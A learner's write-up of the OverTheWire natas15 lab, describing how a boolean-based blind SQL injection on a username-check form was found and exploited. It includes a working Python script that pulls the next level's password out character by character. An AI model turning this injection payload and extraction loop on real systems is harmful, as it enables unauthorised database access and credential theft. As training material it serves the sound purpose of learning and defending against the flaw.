#### Challenge:
- Start here:
- Username: natas15
- Password: ( Password obtained from previous level ) 
- URL: http://natas15.natas.labs.overthewire.org 

#### My path: 
  - I opened the website using credentials.
  - It asked to enter the username. It only checks whether the username exists.
  - Entering a single quote (') was handled normally,The application responded with ‘This user doesn’t exist’, indicating that 
    the input was treated as data and no SQL injection occurred.
  - From this behavior, it was observed that user input appears to be directly concatenated into the SQL query.
  - Entering a double quote (") caused a query error, breaking the SQL structure and confirming the presence of SQL injection.
  - Next,Injecting boolean-based logic resulted in a response indicating 'This user exists', confirming that the backend evaluated
    the injected condition.
  - Since the application does not display query results and only reveals information through true/false responses, this is a boolean-based
    blind SQL injection.
  - To fully understand the extraction technique and verify my approach, I referred to a public YouTube walkthrough.
  - I referred to a public GitHub script as a learning reference to understand how boolean-based blind SQL injection can be automated.
    The script was used as a learning aid to observe how character-by-character password extraction works.
  - Burp Intruder was used to automate similar boolean-based checks in order to determine the password length from response differences.

## Script Logic (Understanding):
  - Loop through allowed characters (a–z, A–Z, 0–9).
  - Inject a boolean condition checking if the password starts with a prefix.
  - Observe the application's true/false response.
  - Append the correct character when the condition evaluates to true.

#### Script:
import requests
import re
import string
username = 'natas15'
password = '(Enter the password obtained from previous level)'
url = f"http://{username}.natas.labs.overthewire.org/?debug=true"
letters = string.ascii_letters + string.digits
nataspass = ''
while len(nataspass) < 32:
	for char in letters:
		print(f"Attempting password: {nataspass}{char}")
		response = requests.post(url, auth = (username, password), data = {"username": 'natas16" and BINARY password LIKE "' + nataspass + char +
    '%" #'}, )
		if "exists" in response.text:
			nataspass += char
			print(nataspass)
			break

#### Learning Outcomes:
  - Identified blind SQL injection without seeing query output.
  - Learned how boolean-based responses can leak sensitive data.
  - Observed how automation helps extract data.

#### Real-World Mapping:
  - Login or user-validation endpoints that return different messages can leak information.
  - Applications that only return true/false responses are still vulnerable to data extraction.
  - Blind SQL injection is common in production systems with suppressed error messages.

#### Bug Class:
  - Boolean-Based Blind SQL Injection
  - Happens when user input is used in an SQL query and the application shows different responses 
    for true or false conditions, allowing data to be guessed without seeing the output.

#### Conclusion:
This challenge showed that by observing response differences and using boolean logic, sensitive data can still be extracted.
It highlights the importance of proper input validation and secure query handling.
  

